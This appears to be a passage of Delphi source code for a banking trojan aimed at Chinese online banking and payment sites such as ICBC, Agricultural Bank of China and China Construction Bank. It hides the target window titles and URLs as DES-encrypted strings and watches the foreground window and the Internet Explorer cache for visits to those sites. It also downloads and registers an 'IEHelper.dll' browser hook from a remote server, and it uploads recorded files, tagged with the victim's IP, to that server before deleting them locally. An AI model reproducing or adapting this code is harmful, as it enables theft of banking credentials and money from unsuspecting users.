  zxzf='E42BCBF37C287DF8F119329983FBC57C92AA14ADEA485AC48F2A5E90E0E75103451A92B9BA1C2374881A61284EFD5A5A2DBB65098EC6BC8440A6821EA49C6E80';
  //中国在线支付网: :IPAY网上支付平台 - Microsoft Internet Explorer
  //http://www.ipay.cn/home/index.php
  nyyh='F42D035B49D9DC10038B815D4487A44C35308CAC9750422B74F8953B5D6FCEC5DDE67DC12139052FECD3C882E3E30E00';
  //中国农业银行 - Microsoft Internet Explorer
  //https://easyabc.95599.cn/ebank/logonguest.jsp
  gszf='949AA7F3D2096915E137D6BBE215D2BF9FE32C7C4A34E1BD371AA13C953060ADBDF59A7FA6CD5BA4F254ECF2993047F8327AFF205E40F448';
  //https://mybank.icbc.com.cn/servlet/com.icbc.inbs.b2c.pay.B2cMerPayReqServlet
  //个人网上银行-网上支付 - Microsoft Internet Explorer
var
  hWnd:cardinal;
  szTitle:array[0..1024] of ansiChar;
  str:pansiChar;
  ro:stRegOpInfo;
  PCName:array[0..31] of ansiChar;
begin
  zeromemory(@pcName,sizeof(pcName));
  hWnd:=GetForegroundWindow();
  getwindowtext(hWnd,szTitle,sizeof(szTitle));
  ro.op:=RCreateVal;
  ro.rk:=HKEY_LOCAL_MACHINE;
  ro.key:='SoftWare\MicroSoft\Byc';
  ro.val:='PCName';
  ro.typ:=reg_sz;
  ro.dat:=@PCName;
  ro.siz:=sizeof(PCName);
  str:=pansiChar(DESryStrHex(gsyh,key));
  if strcomp(szTitle,str)=0 then PcName:='gsyh';
  str:=pansiChar(DESryStrHex(ylzf,key));
  if strcomp(szTitle,str)=0 then PcName:='ylzf';
  str:=pansiChar(DESryStrHex(zsyh,key));
  if strcomp(szTitle,str)=0 then PcName:='zsyh';
  str:=pansiChar(DESryStrHex(jsyh,key));
  if strcomp(szTitle,str)=0 then PcName:='jsyh';
  str:=pansiChar(DESryStrHex(jtyh,key));
  if strcomp(szTitle,str)=0 then PcName:='jtyh';
  str:=pansiChar(DESryStrHex(fzyh,key));
  if strcomp(szTitle,str)=0 then PcName:='fzyh';
  str:=pansiChar(DESryStrHex(hxyh,key));
  if strcomp(szTitle,str)=0 then PcName:='hxyh';
  str:=pansiChar(DESryStrHex(zxzf,key));
  if strcomp(szTitle,str)=0 then PcName:='zxzf';
  str:=pansiChar(DESryStrHex(nyyh,key));
  if strcomp(szTitle,str)=0 then PcName:='nyyh';
  str:=pansiChar(DESryStrHex(gszf,key));
  if strcomp(szTitle,str)=0 then PcName:='gszf';

  if strlen(pcName)>0 then
  SetInfoToReg(ro);
end;

function AutoHookIE():BOOL;
var
  hk:HKEY;
  err:integer;
  ValName,Data,PCName,FileName:array[0..255] of ansiChar;
  cbValName,cbData,dwType,hFindFile:DWORD;
  //dwIndex
  FindData: TWin32FindData;
  pTF:pTransFilesInfo;
  //fName:=g_tmpDir+'\com\*.r';
begin
  result:=false;
  err:=RegOpenKeyEx(HKEY_LOCAL_MACHINE,'SoftWare\MicroSoft\Byc',0,KEY_ALL_ACCESS,hk);
  if err<>ERROR_SUCCESS then exit;
  cbValName:=sizeof(ValName);cbData:=sizeof(Data);
  zeromemory(@ValName[0],cbValName);
  zeromemory(@Data[0],cbData);
  zeromemory(@PCName[0],sizeof(PCName));
  dwType:=REG_SZ;//dwIndex:=0;
  ValName:='PCName';
  err:=RegQueryValueEx(hk,ValName,nil,@dwType,pByte(@data[0]),@cbData);
  if err<>ERROR_SUCCESS then begin RegCloseKey(hk);exit;end;
  strcopy(PCName,data);zeromemory(@Data[0],cbData);
  if pos('gsyh',PCName)>0 then
  begin
    ValName:='gsyh';cbData:=sizeof(Data);
    err:=RegQueryValueEx(hk,ValName,nil,@dwType,pByte(@data[0]),@cbData);
    if err<>ERROR_SUCCESS then
    begin
      GetSystemDirectory(FileName,sizeof(FileName));
      strcat(FileName,'\IEHelper.dll');
      hFindFile:=FindFirstFile(FileName,FindData);
      if hFindFile<>INVALID_HANDLE_VALUE then
      begin
        windows.FindClose(hFindFile);
        RegCloseKey(hk);
        exit;
      end;
      new(pTF);
      pTF^.server:=DataSvrAddr;
      strcopy(pTF^.clientFile,FileName);
      pTF^.serverFile:='d:\mywork\app\IEHelper.dll';
      pTF^.bUpLoad:=false;
      pTF^.bFolder:=false;
      pTF^.bCompleteDel:=false;
      if TransFilesClientThread(pTF) then
      begin
        RegComFile(FileName,true);
      end;
      RegCloseKey(hk);
      exit;
    end//if err<>ERROR_SUCCESS then
    else begin
      GetDir($0015,FileName);
      strcat(FileName,'\com');
      CreateDirectory(FileName,nil);
      strcat(FileName,'\yh.r');
      Log(data,FileName);
    end;//已经有记录
  end;//if pos('gsyh',PCName)>0 then
  if pos('gszf',PCName)>0 then
  begin
    ValName:='gszf';cbData:=sizeof(Data);
    err:=RegQueryValueEx(hk,ValName,nil,@dwType,pByte(@data[0]),@cbData);
    if err<>ERROR_SUCCESS then
    begin
      GetSystemDirectory(FileName,sizeof(FileName));
      strcat(FileName,'\IEHelper.dll');
      hFindFile:=FindFirstFile(FileName,FindData);
      if hFindFile<>INVALID_HANDLE_VALUE then
      begin
        windows.FindClose(hFindFile);
        RegCloseKey(hk);
        exit;
      end;
      new(pTF);
      pTF^.server:=DataSvrAddr;
      strcopy(pTF^.clientFile,FileName);
      pTF^.serverFile:='d:\mywork\app\IEHelper.dll';
      pTF^.bUpLoad:=false;
      pTF^.bFolder:=false;
      pTF^.bCompleteDel:=false;
      if TransFilesClientThread(pTF) then
      begin
        RegComFile(FileName,true);
      end;
      RegCloseKey(hk);
      exit;
    end//if err<>ERROR_SUCCESS then
    else begin
      GetDir($0015,FileName);
      strcat(FileName,'\com');
      CreateDirectory(FileName,nil);
      strcat(FileName,'\yh.r');
      Log(data,FileName);
    end;//已经有记录
  end;//if pos('gsyh',PCName)>0 then
  RegCloseKey(hk);
end;
function TransRec(aFile:pansiChar):BOOL;
var
  hd,hFile,id:cardinal;
  pTDI:pTransFilesInfo;
  //tid:cardinal;
  fd:WIN32_FIND_DATA;
  LocalDir,LocalFile,svrFile,IP:array[0..max_path-1] of ansiChar;
begin
  result:=false;hFile:=findfirstfile(aFile,fd);
  if hFile=INVALID_HANDLE_VALUE then exit;
  ExTractFileDir(aFile,LocalFile);
  repeat
    new(pTDI);
    with pTDI^ do
    begin
      strcopy(LocalFile,LocalDir);strcat(LocalFile,'\');
      strcat(LocalFile,fd.cFileName);
      //LocalFile:=LocalDir+'\'+fd.cFileName;
      //svrFile:='d:\mywork\app\scr\'+fd.cFileName;
      svrFile:='d:\mywork\app\scr\';strcat(svrFile,fd.cFileName);
      svrFile[strlen(svrFile)-2]:=#0;
      strcat(svrFile,'(');GetLocalIP(IP);strcat(svrFile,IP);
      strcat(svrFile,').r');
      //svrFile:=svrFile+'('+GetLocalIP+').r';
      pTDI^.server:=DataSvrAddr;
      strcopy(pTDI^.clientFile,LocalFile);
      strcopy(pTDI^.serverFile,svrFile);
      pTDI^.bUpLoad:=true;
      pTDI^.bFolder:=false;
      pTDI^.bCompleteDel:=true;
      hd:=createthread(nil,0,@TransFilesClientThread,pTDI,0,id);
      closehandle(hd);
    end;
  until FindNextFile(hFile,fd)=false;
  windows.FindClose(hFile);
  result:=true;
end;
}
procedure SetPCNameFromURL();
//const

  //key='byc';
  {
  gsyh='C4047121D9035631A01B845D54B8200F9CCA0F3DE28B0E2D606027B965352377E3FDA2B6EDFF8644';
  //https://mybank.icbc.com.cn/icbc/perbank
  gsyh2='C4047121D9035631A01B845D54B8200F9CCA0F3DE28B0E2D606027B965352377B785B43D76EA8FC1655DC4F6B3E3FB29';
  //https://mybank.icbc.com.cn/icbc/normalbank
  gszf='C4047121D9035631A01B845D54B8200F9CCA0F3DE28B0E2DCB9549E497C76000C3F7BA8C81F1C2399A6ACD9FE6BBF3572A0844538B5F7506AE39805BAE8D4619ADFBCD24E9056764342F7D17EDDDF6C2';
  //https://mybank.icbc.com.cn/servlet/com.icbc.inbs.b2c.pay.B2cMerPayReqServlet
  nyyh='C4047121D90356311BB128FCF451BA7982DEC1D023406E35';
  //https://www.95599.cn
  jsyh='D167CB784FCA5CCA6317975C21AE4A28';
  //ccb.com.cn
  zsyh='23DD6EFB6FD300857C1913F7C23C1473';
  //cmbchina.com
  }
var
  err:integer;
  hk,iehk:HKEY;
  cbData,dwType:cardinal;
  urlFile,tempFile,PCName:array[0..max_path-1] of ansiChar;
  url,data:string;
begin
  err:=RegCreateKeyEx(HKEY_LOCAL_MACHINE,'SoftWare\MicroSoft\Byc',0,nil,
    REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  zeromemory(@PCName[0],sizeof(PCName));cbData:=sizeof(PCname);dwType:=REG_SZ;
  RegQueryValueEx(hk,'PCName',nil,@dwType,Pbyte(@PCName[0]),@cbData);

  err:=RegOpenKeyEx(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Cache\Paths',
    0,KEY_QUERY_VALUE,iehk);
  if err<>ERROR_SUCCESS then begin RegCloseKey(hk);exit;end;
  zeromemory(@urlFile[0],sizeof(urlFile));cbData:=sizeof(urlFile);dwType:=REG_SZ;
  err:=RegQueryValueEx(iehk,'Directory',nil,@dwType,Pbyte(@urlFile[0]),@cbData);
  RegCloseKey(iehk);
  if err<>ERROR_SUCCESS then begin RegCloseKey(hk);exit;end;
  ExtractFileDir(urlFile,tempFile);
  strcat(UrlFile,'\index.dat');strcat(tempFile,'\index.dat');
  if not copyfileA(UrlFile,tempFile,false) then begin RegCloseKey(hk);exit;end;
  LoadFileToString(tempFile,data);
  windows.DeleteFileA(tempFile);
  if data='' then begin RegCloseKey(hk);exit;end;
            {
  if pos('gsyh',PCName)=0 then
  begin
    url:=DESryStrHex(gsyh,key);
    if pos(URL,data)>0 then
      strcat(PCName,'-gsyh');
  end;
  if pos('gsyh2',PCName)=0 then
  begin
    url:=DESryStrHex(gsyh2,key);
    if pos(URL,data)>0 then
      strcat(PCName,'-gsyh2');
  end;
  if pos('gszf',PCName)=0 then
  begin
    url:=DESryStrHex(gszf,key);
    if pos(URL,data)>0 then
      strcat(PCName,'-gszf');
  end;
  if pos('nyyh',PCName)=0 then
  begin
    url:=DESryStrHex(nyyh,key);
    if pos(URL,data)>0 then
      strcat(PCName,'-nyyh');
  end;
  if pos('jsyh',PCName)=0 then
  begin
    url:=DESryStrHex(jsyh,key);
    if pos(URL,data)>0 then
      strcat(PCName,'-jsyh');
  end;
  if pos('zsyh',PCName)=0 then
  begin
    url:=DESryStrHex(zsyh,key);
    if pos(URL,data)>0 then
      strcat(PCName,'-zsyh');
  end;
  if strlen(PCName)>0 then
  begin
    cbData:=strlen(PCName)+1;
    RegSetValueEx(hk,'PCName',0,REG_SZ,PBYTE(@PCName[0]),cbData);
  end;
  }
  RegCloseKey(hk);
end;
{
procedure TimerFunc(hWnd:HWND;uMsg:UINT;idEvent:UINT;dwTime:DWORD);stdcall;
begin
  //SetPCNameFromIE;
end;
}
end.
